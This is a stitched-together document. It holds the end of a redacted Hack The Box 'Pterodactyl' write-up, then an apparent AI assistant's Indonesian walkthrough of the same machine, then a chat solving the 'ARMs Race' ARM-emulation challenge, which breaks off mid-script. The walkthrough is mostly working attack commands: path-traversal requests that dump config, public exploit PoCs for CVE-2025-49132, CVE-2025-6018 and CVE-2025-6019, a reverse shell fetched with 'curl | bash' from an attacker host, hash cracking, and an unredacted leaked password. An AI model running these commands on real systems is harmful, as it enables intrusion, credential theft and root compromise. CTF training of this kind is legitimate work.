Virtual host fuzzing identified an additional host: the panel interface.

![Virtual host discovery](assets/05_virtual_host_discovery.png)

This was a key checkpoint because administrative interfaces are often separated from public-facing pages. The discovery of the panel gave the investigation a focused direction.

---

# 4. Endpoint Validation

The next step was to review a locale-related endpoint exposed by the Pterodactyl Panel.

![Locale endpoint validation](assets/06_locale_endpoint_validation_redacted.png)

The response confirmed that the endpoint was reachable and handled by the application. Cookies and tokens were visible in the original response, but they are redacted in this report.

The important learning point is not the token value. The important point is the behavior:

- the endpoint was available without logging in;
- it returned application-controlled content;
- it matched the area described in public vulnerability information.

This is how a responsible CTF practitioner validates a lead: match the machine behavior with the vulnerability description before relying on any proof-of-concept.

---

# 5. Public Vulnerability Research

The Pterodactyl Panel behavior matched CVE-2025-49132. Public vulnerability descriptions indicated that affected versions could expose sensitive application information through the locale mechanism.

![CVE-2025-49132 reference](assets/07_cve_2025_49132_reference.png)

The key concept is **configuration exposure**. Configuration files are like the instruction manual for an application. If that manual accidentally becomes readable, it may reveal where the database is, which credentials are used, and how the application signs or encrypts sensitive data.

---

# 6. Configuration Exposure Validation

The application configuration was reviewed in the lab. Sensitive values such as the application key are redacted below.

![Application config disclosure](assets/08_app_config_disclosure_redacted.png)

The database configuration was also exposed. The password and other sensitive parts are redacted.

![Database config disclosure](assets/09_database_config_disclosure_redacted.png)

This is the first major turning point of the machine.

The lesson is simple: when an application leaks configuration, it may leak the keys to other internal doors. The database itself was not exposed directly to the internet, but the leaked configuration became useful after gaining access inside the lab system.

---

# 7. Initial Lab Access for Deeper Enumeration

After validating the issue, lab access was obtained for deeper enumeration. The screenshot below shows an interactive shell context as the web service user.

![Interactive shell evidence](assets/10_interactive_shell_evidence.png)

At this stage, the goal is not to rush. A web service shell is usually limited. The best practice is to enumerate carefully:

- current user;
- current directory;
- application files;
- local configuration;
- available services;
- possible user accounts;
- logs or local messages.

In simple terms, we moved from standing outside the building to being inside a restricted office. Now the job is to read signs, drawers, and internal notes carefully without assuming anything.

---

# 8. Application Directory Review

Inside the application directory, the environment file confirmed the same type of sensitive configuration exposure. Values are redacted in this report.

![Environment review](assets/11_environment_review_redacted.png)

This confirmed the root cause: sensitive secrets were accessible from the application context. From a defensive perspective, this is serious because application secrets often enable follow-on access.

Important security lessons:

- secrets should not be exposed through application endpoints;
- application keys and database passwords should be rotated after exposure;
- web service users should have the minimum required file access;
- secrets should be monitored and protected like production credentials.

---

# 9. Database Enumeration

With the application context understood, the local database was reviewed. The table overview showed several areas of interest, including user accounts, sessions, API-related data, and recovery data.

![Database table overview](assets/12_database_table_overview.png)

The users table showed accounts and password hashes. Full hashes are redacted.

![Users table redacted](assets/13_users_table_redacted.png)

This step teaches an important real-world risk: even if passwords are hashed, account data exposure is still dangerous. Hashes can sometimes be tested offline, especially if users choose weak or reused passwords.

Think of a password hash as a locked box. It is not the password itself, but if the lock is weak and the attacker has enough time, they may be able to identify what password produced it.

---

# 10. Credential Analysis and SSH Access

One recovered password was found to be reused for SSH access to a lab user. The recovered value is not shown here.

![Password recovery redacted](assets/14_password_recovery_redacted.png)

This is another major lesson from the machine: **password reuse turns one exposure into another access path**.

After SSH access was obtained, the user-level proof was collected. The flag is redacted.

![User access proof](assets/15_user_access_proof_redacted.png)

Professional takeaway:

- never reuse application passwords for system accounts;
- enforce password hygiene;
- monitor exposed hashes as a serious incident;
- rotate credentials after a configuration leak.

---

# 11. Local Enumeration and the Mail Clue

After user access, local enumeration revealed an internal mail message referencing unusual `udisksd` activity.

![Local mail clue](assets/16_local_mail_clue.png)

This was not random. In CTFs, local mail, notes, scripts, and unusual file names often act as clues. The message pointed toward a local privilege escalation path involving udisks/libblockdev behavior.

A good practitioner does not blindly run tools after seeing a clue. The better approach is:

1. identify the clue;
2. form a hypothesis;
3. research the related component;
4. validate whether the system matches the vulnerability conditions;
5. proceed only inside the authorized lab scope.

---

# 12. Privilege Escalation Research

The clue aligned with public information about CVE-2025-6018 and CVE-2025-6019.

![CVE-2025-6018 reference](assets/17_cve_2025_6018_reference.png)

CVE-2025-6018 relates to session and policy behavior. In simple terms, it can affect whether the system treats a user as having a kind of locally active session.

![CVE-2025-6019 reference](assets/18_cve_2025_6019_reference.png)

CVE-2025-6019 relates to udisks/libblockdev behavior. In simple terms, the storage-management component can be influenced in a way that leads to elevated privileges under the right conditions.

The chain matters: one issue helps create the right session/policy condition, and the other issue uses that condition to reach a stronger privilege level.

A simple analogy: one weakness makes the badge reader believe the user is standing at the front desk, while the second weakness allows that badge state to access a maintenance elevator.

---

# 13. Privilege Escalation Validation

The privilege escalation path was validated inside the HTB lab. Sensitive command-line values are redacted in the screenshot.

![Privilege validation redacted](assets/19_privilege_validation_redacted.png)

Successful validation resulted in root-level access in the lab environment.

![Root access proof](assets/20_root_access_proof_redacted.png)

The root flag value is not shown. The purpose of the screenshot is only to document that the lab objective was completed.

---

# 14. Defensive Lessons Learned

This machine is valuable because every offensive step maps to a defensive lesson.

| Finding | Defensive Lesson |
|---|---|
| Virtual hosts exposed multiple applications | Inventory all hostnames and review hidden admin surfaces |
| Locale endpoint exposed sensitive data | Patch vulnerable software and validate input paths carefully |
| Application config leaked secrets | Rotate application keys, database passwords, and related tokens |
| Database contained user hashes | Protect database access and monitor credential exposure |
| Password reuse enabled SSH access | Enforce unique credentials and stronger authentication controls |
| Local mail revealed operational clue | Avoid leaving sensitive operational hints accessible to normal users |
| udisks/libblockdev path allowed privilege escalation | Apply timely system patches and restrict risky local authorization behavior |

---

# 15. Final Reflection

Pterodactyl is not just a machine about running a public proof-of-concept. It is a machine about building a chain from evidence.

The professional workflow was:

1. enumerate what is exposed;
2. understand the application context;
3. validate the vulnerability behavior;
4. review exposed configuration carefully;
5. analyze credentials ethically inside the lab;
6. pivot only when evidence supports it;
7. use local clues to guide privilege escalation research;
8. document findings with sensitive data redacted.

The biggest takeaway is that cybersecurity is not about blindly using tools. It is about asking the right questions, validating assumptions, and documenting the risk in a way that helps others learn and defend systems better.

---

## Ethical Note

This writeup is for CTF learning only. The same techniques must never be used against systems without explicit permission. A high-morality cybersecurity practitioner uses these skills to understand risk, improve defenses, report responsibly, and protect people.

Siap. Kita anggap ini **HTB private lab** dan kita pakai writeup itu sebagai “peta”, tapi bukan sekadar copy-paste. Inti flow writeup-nya adalah: **enumeration → virtual host discovery → panel Pterodactyl → CVE file disclosure → ambil secrets/DB creds → RCE → shell sebagai web user → database user hashes → crack password → SSH user → local enum → mail clue udisksd → chain CVE LPE → root**. 

Dari screenshot kamu, **target IP sekarang adalah `10.129.29.227`**, sedangkan writeup memakai IP lain. Jadi semua command dari writeup yang memakai `10.129.2.65`, `10.129.9.251`, atau IP lain harus kamu ganti.

---

## Aturan main dulu

Buat variabel biar tidak salah IP:

```bash
export TARGET=10.129.29.227
export DOMAIN=pterodactyl.htb
```

Cek IP VPN kamu sendiri untuk reverse shell nanti:

```bash
ip -4 addr show tun0
```

Nanti IP `tun0` kamu menggantikan IP attacker di writeup seperti `10.10.14.166`.

---

# Checkpoint 1 — Recon awal: cari pintu masuk

Tujuan: memastikan service apa yang terbuka.

```bash
nmap -sCV -A -oN nmap-initial.txt $TARGET
```

Expected dari writeup:

```text
22/tcp open ssh
80/tcp open http nginx
```

Yang harus kamu pahami:

Port `22` biasanya belum bisa dipakai tanpa kredensial. Port `80` jadi fokus utama karena web app sering memberi clue seperti redirect, hostname, path tersembunyi, atau software/version.

Cek HTTP-nya:

```bash
curl -I http://$TARGET
```

Kalau muncul redirect ke `pterodactyl.htb`, itu tanda **virtual host routing**.

---

# Checkpoint 2 — Mapping domain lokal

Tambahkan hostname ke `/etc/hosts`.

```bash
echo "$TARGET pterodactyl.htb play.pterodactyl.htb panel.pterodactyl.htb" | sudo tee -a /etc/hosts
```

Kenapa ini penting?

Server bisa memberi konten berbeda berdasarkan header `Host`. Jadi:

```bash
curl http://10.129.29.227
curl http://pterodactyl.htb
curl http://play.pterodactyl.htb
```

bisa menghasilkan halaman berbeda walaupun IP-nya sama.

---

# Checkpoint 3 — Virtual host fuzzing

Tujuan: cari subdomain internal seperti `panel`.

Pertama cari ukuran response palsu/baseline:

```bash
curl -s -H "Host: randomtest123.pterodactyl.htb" http://$TARGET | wc -c
```

Misal hasilnya `145`, pakai filter `-fs 145`.

```bash
ffuf -u http://$TARGET/ \
  -H "Host: FUZZ.pterodactyl.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 145
```

Expected:

```text
panel    [Status: 200, Size: ...]
```

Kalau dapat `panel`, buka:

```text
http://panel.pterodactyl.htb
```

Checkpoint berhasil kalau kamu melihat login page Pterodactyl Panel.

---

# Checkpoint 4 — Jangan langsung exploit: validasi endpoint dulu

Writeup memakai endpoint ini:

```bash
curl -v "http://panel.pterodactyl.htb/locales/locale.json"
```

Yang dicari:

```text
HTTP/1.1 200 OK
X-Powered-By: PHP/8.4.8
Set-Cookie: XSRF-TOKEN=...
Set-Cookie: pterodactyl_session=...
```

Maknanya:

Aplikasi Pterodactyl aktif, endpoint locale bisa diakses tanpa login, dan session dibuat walau belum autentikasi. Ini memperkuat dugaan bahwa attack surface ada di mekanisme locale.

---

# Checkpoint 5 — Validasi file disclosure secara manual

Sebelum pakai PoC, coba pahami bug-nya: parameter `locale` dipakai untuk traversal, parameter `namespace` menunjuk file config.

```bash
curl -G "http://panel.pterodactyl.htb/locales/locale.json" \
  --data-urlencode "locale=../../../pterodactyl" \
  --data-urlencode "namespace=config/database" | jq
```

Expected:

```json
{
  "host": "127.0.0.1",
  "port": "3306",
  "database": "panel",
  "username": "pterodactyl",
  "password": "PteraPanel"
}
```

Intisarinya:

Database tidak terbuka dari luar, tapi credential-nya bocor dari web app. Nanti setelah dapat shell di mesin, credential ini bisa dipakai untuk login ke MariaDB lokal.

Ambil juga app config:

```bash
curl -G "http://panel.pterodactyl.htb/locales/locale.json" \
  --data-urlencode "locale=../../../pterodactyl" \
  --data-urlencode "namespace=config/app" | jq
```

Cari `APP_KEY`.

---

# Checkpoint 6 — Pakai PoC, tapi pahami fungsinya

Writeup memakai PoC CVE-2025-49132 untuk test/dump/RCE.

```bash
git clone https://github.com/str1keboo/CVE-2025-49132/
cd CVE-2025-49132
python3 CVE-2025-49132-PoC.py test http://panel.pterodactyl.htb
python3 CVE-2025-49132-PoC.py dump http://panel.pterodactyl.htb
```

Sebelum menjalankan exploit dari internet, minimal baca cepat:

```bash
less CVE-2025-49132-PoC.py
grep -nE "requests|locale|namespace|APP_KEY|cookie" CVE-2025-49132-PoC.py
```

Yang kamu pelajari di sini:

PoC bukan “magic”. Ia mengotomasi request yang tadi sudah kamu validasi manual: traversal ke config Laravel, ambil `APP_KEY`, ambil database config, lalu memakai secret itu untuk tahap lanjutan.

---

# Checkpoint 7 — RCE dan reverse shell

Writeup lalu memakai modified exploit:

```bash
git clone https://github.com/malw0re/CVE-2025-49132-Mods.git
cd CVE-2025-49132-Mods
python3 ape1.py --host panel.pterodactyl.htb --interactive
```

Di shell exploit, test dulu:

```bash
whoami
id
pwd
```

Kalau sudah dapat command execution, ubah jadi reverse shell stabil.

Di terminal Kali pertama:

```bash
export ATTACKER_IP=<IP_TUN0_KAMU>
echo "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1" > shell.sh
python3 -m http.server 8080
```

Di terminal Kali kedua:

```bash
nc -lvnp 4444
```

Di shell exploit:

```bash
curl http://<IP_TUN0_KAMU>:8080/shell.sh | bash
```

Expected shell:

```text
wwwrun@pterodactyl:/var/www/pterodactyl/public>
```

Stabilkan shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

# Checkpoint 8 — Enumerasi web app dari dalam

Masuk ke root folder aplikasi:

```bash
cd /var/www/pterodactyl
ls -la
cat .env | egrep -i 'APP_KEY|APP_URL|DB_'
```

Expected:

```text
APP_KEY=base64:...
DB_DATABASE=panel
DB_USERNAME=pterodactyl
DB_PASSWORD=PteraPanel
```

Maknanya:

Kita sekarang membuktikan bahwa data yang dibocorkan oleh endpoint tadi memang berasal dari file `.env` Laravel.

Login ke database lokal:

```bash
/usr/bin/mariadb -h 127.0.0.1 -u pterodactyl -p panel
```

Password:

```text
PteraPanel
```

Di MariaDB:

```sql
SHOW TABLES;
DESCRIBE users;
SELECT username,email,password,root_admin FROM users;
```

Cari user seperti:

```text
headmonitor
phileasfogg3
```

dan hash bcrypt di kolom `password`.

---

# Checkpoint 9 — Crack hash dan pivot ke SSH

Simpan hash ke file di Kali:

```bash
nano hashes.txt
```

Crack:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
john --show hashes.txt --format=bcrypt
```

Expected dari writeup:

```text
!QAZ2wsx
```

Coba SSH dengan user dari database:

```bash
ssh phileasfogg3@pterodactyl.htb
```

Password:

```text
!QAZ2wsx
```

Kalau berhasil:

```bash
id
ls -la
cat user.txt
```

Checkpoint berhasil: kamu punya user flag.

---

# Checkpoint 10 — Local enumeration untuk privilege escalation

Jangan langsung lompat ke exploit root. Cari clue.

```bash
id
groups
sudo -l
uname -a
cat /etc/os-release
ls -la /var/mail
cat /var/mail/phileasfogg3
```

Writeup menemukan clue:

```text
SECURITY NOTICE — Unusual udisksd activity
```

Maknanya:

Mail lokal mengarahkan kita ke `udisksd`. Di CTF, ini biasanya bukan dekorasi. Itu hint untuk privilege escalation.

Lanjut enum:

```bash
ps aux | grep -i udisks
systemctl status udisks2 --no-pager
which udisksctl
```

---

# Checkpoint 11 — Pahami chain root: CVE-2025-6018 + CVE-2025-6019

Flow privilege escalation-nya:

1. **CVE-2025-6018**: membuat sesi user terlihat “active”/authorized lewat manipulasi PAM/Polkit.
2. **CVE-2025-6019**: abuse `udisks/libblockdev` untuk operasi filesystem/mount privileged.
3. Hasil akhirnya dibuat **SUID bash**.
4. SUID bash dijalankan, effective UID menjadi root.

Konsep penting:

```text
-rwsr-xr-x root root bash
```

Huruf `s` berarti SUID. Kalau binary dimiliki root dan SUID aktif, binary bisa berjalan dengan effective privilege root.

---

# Checkpoint 12 — Eksekusi exploit chain sesuai writeup

Siapkan CVE-2025-6019 di Kali:

```bash
git clone https://github.com/guinea-offensive-security/CVE-2025-6019.git
cd CVE-2025-6019
sudo bash exploit.sh
```

Pilih mode local kalau script meminta:

```text
L
```

Expected muncul:

```text
xfs.image
```

Transfer ke target:

```bash
scp exploit.sh phileasfogg3@pterodactyl.htb:/tmp/
scp xfs.image phileasfogg3@pterodactyl.htb:/tmp/
```

Siapkan CVE-2025-6018 binary:

```bash
wget https://raw.githubusercontent.com/ibrahmsql/CVE-2025-6018/refs/heads/main/CVE-2025-6018.py
python3 -m venv venv
source venv/bin/activate
pip install paramiko pyinstaller
pyinstaller --onefile CVE-2025-6018.py
```

Jalankan terhadap target kamu:

```bash
sudo ./dist/CVE-2025-6018 -i 10.129.29.227 -u phileasfogg3 -p '!QAZ2wsx'
```

Kalau masuk interactive shell exploit:

```bash
id
cd /tmp
export PATH=$PATH:/sbin
bash exploit.sh
```

Kalau berhasil, output akan menunjukkan SUID bash seperti:

```text
[+] SUID bash found: /tmp/blockdev.xxxxxx/bash
```

Jalankan:

```bash
/tmp/blockdev.xxxxxx/bash -p
id
```

Expected:

```text
euid=0(root)
```

Ambil root flag:

```bash
cat /root/root.txt
```

---

## Troubleshooting penting

Kalau muncul:

```text
Required tool 'mkfs.xfs' is not installed
```

cek:

```bash
ls -l /sbin/mkfs.xfs
export PATH=$PATH:/sbin
which mkfs.xfs
bash exploit.sh
```

Kalau reverse shell tidak masuk:

```bash
ip -4 addr show tun0
sudo ufw status
nc -lvnp 4444
python3 -m http.server 8080
```

Pastikan payload memakai IP `tun0`, bukan IP Wi-Fi/LAN.

Kalau `ffuf` tidak menemukan `panel`:

```bash
curl -s -H "Host: anything.pterodactyl.htb" http://$TARGET | wc -c
```

Gunakan ukuran itu di `-fs`. Bisa juga pakai:

```bash
ffuf -u http://$TARGET/ \
  -H "Host: FUZZ.pterodactyl.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -fw <jumlah_words_baseline>
```

---

## Yang harus kamu catat supaya benar-benar dapat ilmu

Untuk tiap checkpoint, tulis jawaban ini di notes:

```text
1. Apa yang ditemukan?
2. Kenapa temuan ini penting?
3. Attack surface baru apa yang terbuka?
4. Kalau cara ini gagal, alternatif enum apa?
```

Contoh mindset:

```text
Nmap menemukan 80 HTTP → web jadi fokus.
HTTP redirect ke pterodactyl.htb → butuh /etc/hosts.
Vhost fuzz menemukan panel → ada admin interface.
Locale endpoint bisa baca config → ada file disclosure.
Config bocor DB creds dan APP_KEY → secrets compromise.
DB berisi bcrypt hash user → crack offline.
Password reuse ke SSH → user access.
Mail menyebut udisksd → hint privesc.
CVE chain menghasilkan SUID bash → root.
```

Mulai jalankan dari **Checkpoint 1 sampai 3** dulu. Kalau hasil `nmap`, `curl -I`, atau `ffuf` kamu berbeda dari expected, kirim output-nya, nanti kita sesuaikan jalurnya tanpa terpaku mentah ke writeup.


Maaf bro, tadi responsku kosong. Ini tanggapan aman dan edukatifnya.

Pemahamanmu **sudah tepat banget**. Flow yang kamu rangkum sudah menangkap inti machine ini: dari web recon, vhost discovery, validasi CVE, file disclosure, RCE, credential harvesting, SSH pivot, sampai privilege escalation via clue lokal. Itu memang alur utama writeup Pterodactyl HTB yang kamu pakai sebagai referensi. 

Yang bisa kamu tingkatkan sebagai pemain CTF:

## 1. Jangan berpikir “cari CVE”, tapi “buktikan fingerprint”

Kalimatmu: “kita searching terkait CVE pada mesin terkait” sudah benar, tapi level berikutnya adalah:

> “Saya mengidentifikasi software, endpoint, behavior, versi/teknologi, lalu mencari vulnerability yang cocok dengan bukti tersebut.”

Jadi bukan sekadar:

```text
Ini Pterodactyl → cari CVE Pterodactyl
```

Tapi lebih matang:

```text
Panel Pterodactyl ditemukan
Endpoint /locales/locale.json terbuka
Backend PHP/Laravel
Ada session/cookie sebelum login
Ada behavior locale handling
CVE file disclosure cocok dengan behavior ini
```

Ini penting karena di real pentest/CTF lanjutan, banyak “CVE bait”. Nama software saja belum cukup. Kamu perlu **mencocokkan gejala teknis**.

---

## 2. Validasi manual sebelum PoC adalah skill besar

Bagian terbaik dari flow ini adalah ketika kamu tidak langsung “run exploit”, tapi memahami bahwa bug-nya ada pada:

```text
locale traversal + namespace file config
```

Itu pelajaran penting. PoC hanyalah automasi. Ilmunya ada di:

```text
Input apa yang dikontrol attacker?
File apa yang bisa dibaca?
Path traversal-nya sejauh mana?
Apakah butuh auth?
Impact-nya apa?
```

Biasakan setiap kali pakai PoC, jawab 4 pertanyaan ini:

```text
1. Bug class-nya apa? LFI, traversal, deserialization, RCE, auth bypass?
2. Entry point-nya di mana?
3. Precondition-nya apa? Auth? Version? Config tertentu?
4. Impact awalnya apa? Read file, session forgery, command execution?
```

---

## 3. Bedakan “initial access” dan “real access”

RCE lewat web itu belum tentu nyaman. Kamu benar ketika mengubahnya menjadi reverse shell, lalu pivot ke SSH.

Secara konsep:

```text
RCE web      = akses rapuh, sering timeout, environment terbatas
Reverse shell = lebih interaktif, tapi masih user web
SSH user     = akses stabil, punya home, punya shell normal
Root         = full compromise
```

Jadi lesson-nya:

> Shell pertama bukan tujuan akhir. Shell pertama adalah pijakan untuk mendapatkan akses yang lebih stabil.

---

## 4. Credential reuse adalah tema besar machine ini

Kamu menemukan DB credential, lalu user hash, lalu crack, lalu SSH. Ini bukan cuma “ambil password”.

Ini chain-nya:

```text
File disclosure → .env/config → DB creds → users table → bcrypt hash → crack → SSH reuse
```

Insight penting:

* `.env` adalah target emas di Laravel.
* DB lokal sering tidak terbuka dari luar, tapi bisa diakses setelah foothold.
* Hash tidak langsung berarti password, tapi bisa jadi peluang offline cracking.
* Password reuse adalah pivot klasik dari web app ke system user.

Secara defensive mindset, satu kebocoran config bisa berujung full compromise.

---

## 5. Local enumeration kamu harus berbasis “clue + bukti”

Kamu menemukan mail tentang `udisksd`. Bagus. Tapi jangan langsung percaya 100%.

Cara berpikir coach:

```text
Clue: mail menyebut udisksd
Hipotesis: udisksd/libblockdev vulnerable
Validasi:
- Apakah service berjalan?
- Apakah binary/tool tersedia?
- Apakah polkit/session behavior cocok?
- Apakah exploit butuh active session?
- Apakah versi OS/library mendukung?
```

Jadi bukan:

```text
Ada clue udisksd → langsung exploit
```

Tapi:

```text
Ada clue → bentuk hipotesis → validasi → baru exploit
```

Ini membedakan “ikut writeup” dengan “memahami exploitation path”.

---

## 6. Pahami kenapa CVE-2025-6018 dan CVE-2025-6019 perlu digabung

Bagian privesc ini menarik karena bukan satu bug tunggal.

Secara konsep sederhana:

```text
CVE-2025-6018 → membuat kondisi authorization/session menjadi menguntungkan
CVE-2025-6019 → memanfaatkan udisks/libblockdev untuk aksi privileged
Hasil akhir     → SUID bash/root shell
```

Jadi 6018 adalah semacam “buka pintu policy/session”, 6019 adalah “gunakan pintu itu untuk bikin primitive root”.

Yang perlu kamu pahami bukan cuma “jalanin dua exploit”, tapi:

> Kenapa exploit kedua membutuhkan kondisi yang disiapkan oleh exploit pertama?

Itu pola umum di machine medium/hard: **chained vulnerabilities**.

---

## 7. Setelah root, jangan langsung selesai: lakukan post-root review

Setelah submit root flag, lakukan 15 menit review:

```text
1. Apa initial foothold?
2. Apa vulnerability class?
3. Apa secret yang bocor?
4. Apa pivot credential?
5. Apa privesc vector?
6. Apa defensive fix?
7. Bagian mana yang tadi masih hanya ikut writeup?
```

Untuk machine ini, attack graph-mu bisa ditulis begini:

```text
80/tcp nginx
  ↓
vhost pterodactyl.htb/play/panel
  ↓
Pterodactyl Panel
  ↓
CVE-2025-49132 locale traversal
  ↓
read config/app + config/database
  ↓
APP_KEY + DB creds
  ↓
RCE / shell as wwwrun
  ↓
read .env + access MariaDB
  ↓
dump users table
  ↓
crack bcrypt
  ↓
SSH as phileasfogg3
  ↓
local mail clue: udisksd
  ↓
CVE-2025-6018 + CVE-2025-6019
  ↓
SUID bash
  ↓
root
```

Kalau kamu bisa menggambar attack graph seperti ini tanpa lihat writeup, berarti kamu benar-benar paham.

---

## 8. Cara belajar ulang machine ini biar ilmunya nempel

Coba ulangi dengan 3 mode:

**Mode 1 — Guided replay**
Ikuti notes kamu sendiri, bukan writeup.

**Mode 2 — No-command replay**
Tulis ulang flow tanpa command. Fokus pada alasan:

```text
Kenapa saya melakukan ini?
Apa yang saya harapkan?
Apa arti hasilnya?
```

**Mode 3 — Defense report**
Tulis dari sisi blue team:

```text
Root cause:
- Pterodactyl vulnerable
- Sensitive config readable via traversal
- APP_KEY/DB credentials exposed
- Password reuse
- Local privilege escalation unpatched

Fix:
- Patch Pterodactyl
- Rotate APP_KEY dan DB password
- Reset user passwords
- Disable password reuse
- Patch PAM/polkit/udisks/libblockdev
- Harden local mail/log exposure
- Monitor suspicious locale endpoint access
```

Ini akan membuatmu tidak cuma jago “pwn”, tapi juga paham mitigasi.

---

## 9. Satu koreksi kecil dari rangkumanmu

Kamu bilang:

> “masuk lewat SSH berdasarkan credentials yang kita dapat”

Lebih presisi:

```text
Kita tidak langsung mendapat plaintext SSH credential.
Kita mendapat user records + bcrypt hashes dari DB.
Lalu hash di-crack.
Hasil plaintext password ternyata reusable untuk SSH.
```

Itu penting karena membedakan:

```text
credential disclosure
```

dengan:

```text
hash extraction + offline cracking + credential reuse
```

---

## 10. Level berikutnya untuk kamu

Untuk machine berikutnya, targetkan bukan cuma “root”, tapi:

```text
Root tanpa copy-paste exploit
Root dengan catatan attack graph
Root dengan minimal 1 validasi manual sebelum PoC
Root dengan defensive summary
Root dengan writeup versimu sendiri
```

Kesimpulannya: kamu sudah menangkap flow besar dengan benar. Yang perlu ditingkatkan sekarang adalah **presisi reasoning**: jangan hanya tahu “apa command-nya”, tapi tahu **kenapa command itu masuk akal, bukti apa yang dicari, dan pivot apa yang terbuka setelahnya**.


## CHAT 7
Ya, ini **HTB ARMs Race**. Intinya bukan web challenge biasa: service itu mengirim **ARM machine code dalam bentuk hex**, lalu meminta kamu menjawab nilai akhir register tertentu, biasanya `r0`. Ada **50 level** dan waktunya pendek, jadi harus diotomasi. Writeup publik juga mengonfirmasi pola challenge ini: server mengirim ARM bytecode, kita emulasikan, lalu kirim nilai `r0` balik ke server. ([Tawsif Shahriar][1])

Untuk hex yang kamu kirim, instruksi awalnya:

```text
370301e3
```

Dibaca sebagai byte little-endian:

```text
0xe3010337
```

Itu adalah:

```asm
movw r0, #0x1337
```

Jadi benar: ini kode **ARM 32-bit little-endian**.

Untuk Level 1 yang kamu paste, nilai akhirnya kemungkinan:

```text
1609955296
```

atau dalam hex:

```text
0x5ff5f7e0
```

Tapi karena instance bisa regenerate kalau kamu reconnect/timeout, jangan andalkan angka itu untuk seluruh challenge. Pakai script.

---

## Flow penyelesaiannya

Kita tidak perlu reverse semua instruksi manual. Alasannya:

1. Server memberi hex ARM.
2. Kalau kita decode manual, banyak operasi: `movw`, `movt`, `eor`, `add`, `sub`, `adc`, `sbc`, `mul`, dan lain-lain.
3. Ada 50 level dan time limit pendek.
4. Solusi paling stabil adalah **emulate ARM code** pakai Unicorn Engine, lalu baca `r0`.

Unicorn cocok di sini karena ia bisa mengeksekusi bytecode ARM langsung di Python. Pendekatannya juga dipakai oleh banyak solver challenge ini. ([Tawsif Shahriar][1])

---

## Jangan buka pakai browser

Tampilan “web” yang kamu lihat kemungkinan karena kamu buka raw TCP service di browser. Browser mengirim request seperti:

```text
GET / HTTP/1.1
```

Server mengira itu jawaban register, lalu membalas:

```text
Register r0: Value not recognized
```

Jadi pakainya lewat script/socket, bukan browser.

---

## Install tools

Di Kali/Ubuntu:

```bash
python3 -m pip install pwntools unicorn
```

---

## Solver otomatis

Simpan sebagai `solve.py`:

```python
from pwn import *
from unicorn import *
from unicorn.arm_const import *
import re

HOST = "154.57.164.66"
PORT = 31034

ADDRESS = 0x10000
MEM_SIZE = 2 * 1024 * 1024

def emulate_arm(hex_code: str) -> int:
    code = bytes.fromhex(hex_code)

    mu = Uc(UC_ARCH_ARM, UC_MODE_ARM)
    mu.mem_map(ADDRESS, MEM_SIZE)
    mu.mem_write(ADDRESS, code)

    mu.emu_start(ADDRESS, ADDRESS + len(code))

    return mu.reg_read(UC_ARM_REG_R0)

io = remote(HOST, PORT)

while True:
    data = io.recvuntil(b"Register", timeout=5)

    if not data:
        break

    text = data.decode(errors="ignore")
    print(text, end="")

    match = re.search(r"Level\s+\d+/50:\s*([0-9a-fA-F]+)", text)
    if not match:
        print(io.recvall(timeout=2).decode(errors="ignore"))
        break

    hex_code = match.group(1)
    r0 = emulate_arm(hex_code)

    io.recvuntil(b":")
    print(f"Sending r0 = {r0}")
    io.sendline(str(r0).encode())

io.interactive()
```

Jalankan:

```bash
python3 solve.py
```

Kalau berhasil, dia akan menjawab 50 level otomatis dan flag muncul di akhir.

---

## Kenapa script ini bekerja?

Bagian pentingnya ini:

```python
mu = Uc(UC_ARCH_ARM, UC_MODE_ARM)
```

Artinya kita membuat emulator CPU ARM mode 32-bit.

Lalu:

```python
mu.mem_map(ADDRESS, MEM_SIZE)
mu.mem_write(ADDRESS, code)
```

Kita siapkan memory kosong, lalu taruh bytecode dari server ke alamat emulator.

Lalu:

```python
mu.emu_start(ADDRESS, ADDRESS + len(code))
```

Ini menjalankan seluruh instruksi ARM dari awal sampai akhir.

Terakhir:

```python
mu.reg_read(UC_ARM_REG_R0)
```

Kita ambil nilai akhir register `r0`, lalu kirim balik ke server.

---

## Mental model gampangnya

Bayangkan server memberi kamu program kecil:

```asm
movw r0, #0x1337
movw r1, #...
movt r1, #...
eor  r0, r0, r1
mul  r0, r0, r2
...
```

Tugasmu bukan “menebak flag”, tapi menjawab:

> Setelah program ARM ini dijalankan, isi `r0` berapa?

Karena ada 50 program berbeda, kita biarkan emulator menjalankannya.

---

Kalau script stuck di parsing, kirimkan output terminalnya. Biasanya tinggal menyesuaikan `recvuntil()` karena format prompt kadang sedikit beda antar instance.

[1]: https://tawsifshahriar7.github.io/posts/2024/08/blog-post-5/?utm_source=chatgpt.com "HTB ARMs Race - Tawsif Shahriar"


Bro itu **bukan error emulasi ARM-nya**. Itu error di **flow script setelah level 50**.

Dari log kamu, script sudah sampai:

```text
Level 50/50: ...
Register
Sending r0 = 1291851879
EOFError
[*] Closed connection to 154.57.164.66 port 31034
```

Artinya script kamu **sudah mengirim jawaban untuk Level 50**, lalu masuk loop lagi dan mencoba nunggu prompt berikutnya:

```python
data = io.recvuntil(b"Register", timeout=5)
```

Padahal setelah **Level 50/50**, server sudah tidak akan kirim `Register` berikutnya. Biasanya dia antara:

1. ngirim flag lalu close connection, atau
2. langsung close connection kalau jawaban salah, atau
3. flag sempat masuk tapi script kamu tidak nge-print karena nunggu kata `Register`.

Jadi `EOFError` muncul karena koneksi ditutup saat script masih maksa nunggu `Register` lagi. Ini kelihatan jelas dari log kamu: error terjadi **setelah** `Sending r0 = 1291851879`, bukan saat emulasi Level 50. 

---

## Fix paling gampang

Ubah script supaya kalau levelnya `50/50`, setelah kirim jawaban dia langsung baca sisa output server.

Ganti bagian loop kamu jadi begini:

```python
from pwn import *
from unicorn import *
from unicorn.arm_const import *
import re

HOST = "154.57.164.66"
PORT = 31034

ADDRESS = 0x10000
MEM_SIZE = 2 * 1024 * 1024

def emulate_arm(hex_code: str) -> int:
    code = bytes.fromhex(hex_code)

    mu = Uc(UC_ARCH_ARM, UC_MODE_ARM)
    mu.mem_map(ADDRESS, MEM_SIZE)
    mu.mem_write(ADDRESS, code)

    mu.emu_start(ADDRESS, ADDRESS + len(code))

    return mu.reg_read(UC_ARM_REG_R0)

io = remote(HOST, PORT)

while True:
    try:
        data = io.recvuntil(b"Register", timeout=5)
    except EOFError:
